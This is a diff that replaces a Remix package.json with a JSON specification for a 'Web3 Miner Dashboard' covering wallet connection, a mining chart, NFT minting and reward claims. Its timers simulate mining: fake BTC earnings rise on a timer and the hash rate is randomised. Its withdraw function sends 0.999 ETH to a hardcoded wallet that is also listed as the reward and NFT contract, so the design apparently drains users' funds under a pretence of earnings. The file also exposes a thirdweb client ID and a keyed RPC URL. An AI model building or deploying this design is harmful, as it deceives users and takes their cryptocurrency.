@@ -1,27 +1,283 @@
 {
-  "name": "remix-template-remix",
-  "private": true,
-  "description": "",
-  "license": "",
-  "sideEffects": false,
-  "scripts": {
-    "build": "remix build",
-    "dev": "remix dev",
-    "start": "remix-serve build"
+  "project": {
+    "name": "Miner Web3",
+    "language": "en",
+    "description": "Web3 mining dengan fitur wallet connection, mining simulator, NFT minting, RPC checker, reward claim, dan thirdweb connect."
+  },
+  "meta": {
+    "charset": "UTF-8",
+    "viewport": "width=device-width, initial-scale=1.0"
   },
   "dependencies": {
-    "@remix-run/node": "^1.4.0",
-    "@remix-run/react": "^1.4.0",
-    "@remix-run/serve": "^1.4.0",
-    "react": "^17.0.2",
-    "react-dom": "^17.0.2"
+    "cdn": [
+      "https://cdn.jsdelivr.net/npm/chart.js",
+      "https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"
+    ],
+    "esm_modules": [
+      "https://esm.sh/react",
+      "https://esm.sh/react-dom/client",
+      "https://esm.sh/thirdweb/react",
+      "https://esm.sh/thirdweb",
+      "https://esm.sh/thirdweb/wallets"
+    ]
   },
-  "devDependencies": {
-    "@remix-run/dev": "^1.4.0",
-    "@remix-run/eslint-config": "^1.4.0",
-    "eslint": "^8.11.0"
+  "styles": {
+    "body": {
+      "background": "#0f172a",
+      "color": "white",
+      "padding": "20px"
+    },
+    "grid": {
+      "display": "grid",
+      "template": "repeat(auto-fit,minmax(250px,1fr))",
+      "gap": "20px"
+    },
+    "card": {
+      "background": "#111827",
+      "padding": "20px",
+      "borderRadius": "15px",
+      "border": "1px solid #334155"
+    },
+    "button": {
+      "background": "#2563eb",
+      "color": "white",
+      "borderRadius": "10px"
+    },
+    "buttonStop": {
+      "background": "#dc2626"
+    }
   },
-  "engines": {
-    "node": "16.14.2"
+  "layout": {
+    "title": "⛏️ WEB3 MINER DASHBOARD",
+    "sections": [
+      {
+        "type": "card",
+        "title": "Hash Rate",
+        "id": "rate",
+        "default": "120 MH/s"
+      },
+      {
+        "type": "card",
+        "title": "Mining Timer",
+        "id": "timer",
+        "default": "00:00:00"
+      },
+      {
+        "type": "card",
+        "title": "Total Earnings",
+        "id": "earnings",
+        "default": "0.0000 BTC"
+      },
+      {
+        "type": "card",
+        "title": "Start Miner",
+        "components": [
+          {
+            "type": "input",
+            "id": "minerWallet",
+            "placeholder": "Masukkan wallet address..."
+          },
+          {
+            "type": "text",
+            "id": "walletInfo",
+            "default": "Wallet belum dihubungkan"
+          },
+          {
+            "type": "button",
+            "label": "🔗 CONNECT WALLET",
+            "action": "connectWalletInput"
+          },
+          {
+            "type": "button",
+            "label": "⛏️ START MINER",
+            "action": "startMiningWallet"
+          },
+          {
+            "type": "button",
+            "label": "🛑 STOP MINER",
+            "action": "stopMining"
+          }
+        ]
+      },
+      {
+        "type": "button",
+        "label": "💸 WITHDRAW",
+        "action": "withdrawBalance"
+      },
+      {
+        "type": "card",
+        "title": "Wallet Connection",
+        "components": [
+          {
+            "type": "text",
+            "id": "wallet",
+            "default": "Wallet not connected"
+          },
+          {
+            "type": "button",
+            "label": "CONNECT WALLET",
+            "action": "connectWallet"
+          },
+          {
+            "type": "button",
+            "label": "CLAIM REWARD",
+            "action": "claimReward"
+          },
+          {
+            "type": "button",
+            "label": "MINT NFT",
+            "action": "mintNFT"
+          }
+        ]
+      },
+      {
+        "type": "card",
+        "title": "RPC Connection",
+        "components": [
+          {
+            "type": "button",
+            "label": "TEST RPC",
+            "action": "testRPC"
+          },
+          {
+            "type": "text",
+            "id": "rpcStatus"
+          },
+          {
+            "type": "button",
+            "label": "⚡ CHECK RPC",
+            "action": "getLatestBlock"
+          }
+        ]
+      },
+      {
+        "type": "card",
+        "title": "Mining Chart",
+        "components": [
+          {
+            "type": "canvas",
+            "id": "chart"
+          }
+        ]
+      }
+    ]
+  },
+  "blockchain": {
+    "rpc": {
+      "holesky": "https://ethereum-holesky-rpc.publicnode.com",
+      "thirdweb": "https://1.rpc.thirdweb.com/e6230839e78c90a670b64b1f26c0b3d8"
+    },
+    "contracts": {
+      "nftAddress": "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+      "rewardAddress": "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
+      "withdrawWallet": "0xd8519a8b8825aa0dcc73aad572f447fae102fe88"
+    },
+    "withdraw": {
+      "amountETH": "0.999"
+    }
+  },
+  "thirdweb": {
+    "clientId": "G8vNXJOMTp_TuTQV3kgFIQyKAz_L21F3a9SW57zKanPEqK7iGCHyTUcHKuujJR1q3G2h7d4VHaIlDeR3yn0Wjw",
+    "theme": "dark",
+    "buttonLabel": "CONNECT WEB3",
+    "wallets": [
+      "google",
+      "discord",
+      "telegram",
+      "farcaster",
+      "email",
+      "x",
+      "passkey",
+      "phone",
+      "github",
+      "steam",
+      "tiktok",
+      "coinbase",
+      "guest",
+      "facebook",
+      "epic",
+      "trustwallet",
+      "metamask",
+      "zerion",
+      "rainbow",
+      "binance",
+      "bitget",
+      "uniswap",
+      "safe",
+      "okx",
+      "walletConnect",
+      "smart",
+      "base"
+    ]
+  },
+  "state": {
+    "provider": null,
+    "signer": null,
+    "mining": false,
+    "seconds": 0,
+    "btc": 0,
+    "minerWalletAddress": ""
+  },
+  "functions": [
+    {
+      "name": "connectWalletInput",
+      "description": "Menghubungkan wallet dari input manual"
+    },
+    {
+      "name": "startMiningWallet",
+      "description": "Memulai mining dengan wallet input"
+    },
+    {
+      "name": "stopMining",
+      "description": "Menghentikan mining"
+    },
+    {
+      "name": "withdrawBalance",
+      "description": "Mengirim ETH ke wallet tujuan"
+    },
+    {
+      "name": "connectWallet",
+      "description": "Connect MetaMask wallet"
+    },
+    {
+      "name": "claimReward",
+      "description": "Claim reward contract"
+    },
+    {
+      "name": "mintNFT",
+      "description": "Mint NFT ke wallet user"
+    },
+    {
+      "name": "testRPC",
+      "description": "Tes koneksi RPC Holesky"
+    },
+    {
+      "name": "getLatestBlock",
+      "description": "Mengambil latest block dari Thirdweb RPC"
+    }
+  ],
+  "chart": {
+    "type": "line",
+    "label": "Hash Rate",
+    "initialData": [120, 130, 125, 140, 145, 150],
+    "borderColor": "#38bdf8",
+    "backgroundColor": "rgba(56,189,248,0.2)"
+  },
+  "timers": [
+    {
+      "interval": 1000,
+      "action": "update mining timer"
+    },
+    {
+      "interval": 3000,
+      "action": "increase BTC earnings"
+    },
+    {
+      "interval": 5000,
+      "action": "randomize hash rate and update chart"
+    }
+  ],
+  "events": {
+    "window.onload": "getLatestBlock"
   }
 }
